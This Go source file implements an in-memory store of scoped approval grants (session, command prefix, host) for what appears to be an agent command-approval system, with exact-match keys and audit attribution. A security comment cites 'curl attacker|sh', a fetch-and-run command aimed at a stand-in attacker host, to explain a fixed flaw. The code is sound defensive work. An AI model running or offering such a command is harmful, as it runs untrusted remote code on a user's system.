package approval

import (
	"sync"

	"github.com/CarriedWorldUniverse/agora/contracts"
)

// ScopeAllow is a persisted "allow for this scope" grant — the record
// created when an approver resolves a prompt-policy request with a scope
// wider than "once". Spec: agora-spec-approvals.md §1.
type ScopeAllow struct {
	// Kind is the approval kind this allow covers. A grant never crosses
	// kinds (§1: prefix/host scopes are declared per-kind; session scope is
	// per-thread but still recorded per kind so an exec allow can never
	// leak into, say, escalation).
	Kind contracts.ApprovalKind
	// Scope is contracts.ScopeSession, contracts.ScopePrefix, or
	// contracts.ScopeHost — never contracts.ScopeOnce (nothing to persist).
	Scope contracts.Scope
	// Key is the exact match key:
	//   - ScopeSession: the thread/session id.
	//   - ScopePrefix (exec only): the caller-derived command-prefix token.
	//   - ScopeHost (network): the caller-derived host pattern.
	// Matching is EXACT on this key — see the package doc for why "prefix"
	// scope does not do substring/HasPrefix containment here.
	//
	// ScopeKey NARROWS a ScopeSession grant to the thing the operator was
	// actually shown (for exec: the program name, as ScopePrefix uses).
	// Empty = the pre-2026-07-25 kind-wide session grant, kept for kinds
	// that have no meaningful key.
	Key string
	// ScopeKey narrows a session grant; see Key's doc. Ignored for
	// ScopePrefix/ScopeHost, whose narrowing key IS Key.
	ScopeKey string
	// By is the approver identity that granted the allow — carried into the
	// audit line of every request the grant later short-circuits (ground
	// rule 5 / invariant 3: every decision records stage + actor, including
	// decisions made via a prior grant).
	By string
}

// ScopeStore persists scoped allows and resolves later requests against
// them. The in-memory MemScopeStore is the only implementation this unit
// ships (ground rule 2): a durable/config-file-backed prefix/host store is
// a superset the spec allows (§1: "may be persisted to policy files,
// execpolicy-style, with an explicit save flag") but is not required by the
// U7 DoD (scope PERSISTENCE here means "outlives a single Decide call
// within the running process", tested via scope_test.go — not
// cross-restart durability).
type ScopeStore interface {
	// Grant persists a scope allow. Returns ErrScopeNotPersistable for
	// contracts.ScopeOnce, ErrScopeUnknown for any other unrecognized scope,
	// ErrScopeKindMismatch when the scope is not valid for the kind (prefix
	// is exec-only), and ErrScopeKeyEmpty for an empty key.
	Grant(a ScopeAllow) error
	// Match reports whether a request matches a previously granted scope
	// allow, checking (in order) an exact session-scope match on sessionID,
	// then an exact prefix/host-scope match on scopeKey. It never does
	// substring/prefix-of matching — see the package doc.
	Match(kind contracts.ApprovalKind, sessionID, scopeKey string) (ScopeAllow, bool)
}

// MemScopeStore is the in-memory ScopeStore: a clear, swappable seam (the
// ScopeStore interface) so a future unit can back it with something durable
// without touching the decision pipeline.
type MemScopeStore struct {
	mu sync.RWMutex
	// sessionAllows: (kind, sessionID) -> allow.
	sessionAllows map[[3]string]ScopeAllow
	// keyedAllows: (kind, scope, key) -> allow, for prefix/host scopes.
	keyedAllows map[[3]string]ScopeAllow
}

// NewMemScopeStore constructs an empty in-memory scope store.
func NewMemScopeStore() *MemScopeStore {
	return &MemScopeStore{
		sessionAllows: make(map[[3]string]ScopeAllow),
		keyedAllows:   make(map[[3]string]ScopeAllow),
	}
}

func (s *MemScopeStore) Grant(a ScopeAllow) error {
	if a.Key == "" {
		return ErrScopeKeyEmpty
	}
	// A question resolves with an Answer, never allow/deny (spec §3: it renders
	// as a question card, not the allow/deny modal), so it has no scope-allow
	// semantics — refuse to persist one. Defense in depth for the Decide-side
	// central question guard (review, U7).
	if a.Kind == contracts.KindQuestion {
		return ErrScopeKindMismatch
	}
	switch a.Scope {
	case contracts.ScopeOnce:
		return ErrScopeNotPersistable
	case contracts.ScopeSession:
		// SECURITY (review 2026-07-25): a session grant is keyed by the
		// SCOPE KEY as well as the session, so "approve for session" on one
		// command does not silently trust every later call of the same kind.
		// Before this, Match consulted only (kind, sessionID): approving
		// `npm install` for the session auto-allowed `curl attacker|sh` for
		// the rest of the thread, through a raw /bin/sh -c, attributed to
		// the original innocuous approval. Kinds with no meaningful key
		// (ScopeKey "") keep the previous kind-wide behaviour — see the TUI
		// label, which now says so.
		s.mu.Lock()
		s.sessionAllows[[3]string{string(a.Kind), a.Key, a.ScopeKey}] = a
		s.mu.Unlock()
		return nil
	case contracts.ScopePrefix:
		if a.Kind != contracts.KindExec {
			return ErrScopeKindMismatch
		}
		s.mu.Lock()
		s.keyedAllows[[3]string{string(a.Kind), string(a.Scope), a.Key}] = a
		s.mu.Unlock()
		return nil
	case contracts.ScopeHost:
		// host:<pattern> is network-only (spec §1); the network kind is
		// escalation ("network beyond policy"). Symmetric to prefix's exec-only
		// check — reject a host allow for any other kind (review, U7).
		if a.Kind != contracts.KindEscalation {
			return ErrScopeKindMismatch
		}
		s.mu.Lock()
		s.keyedAllows[[3]string{string(a.Kind), string(a.Scope), a.Key}] = a
		s.mu.Unlock()
		return nil
	default:
		return ErrScopeUnknown
	}
}

func (s *MemScopeStore) Match(kind contracts.ApprovalKind, sessionID, scopeKey string) (ScopeAllow, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	if sessionID != "" {
		if a, ok := s.sessionAllows[[3]string{string(kind), sessionID, scopeKey}]; ok {
			return a, true
		}
	}
	if scopeKey != "" {
		if a, ok := s.keyedAllows[[3]string{string(kind), string(contracts.ScopePrefix), scopeKey}]; ok {
			return a, true
		}
		if a, ok := s.keyedAllows[[3]string{string(kind), string(contracts.ScopeHost), scopeKey}]; ok {
			return a, true
		}
	}
	return ScopeAllow{}, false
}
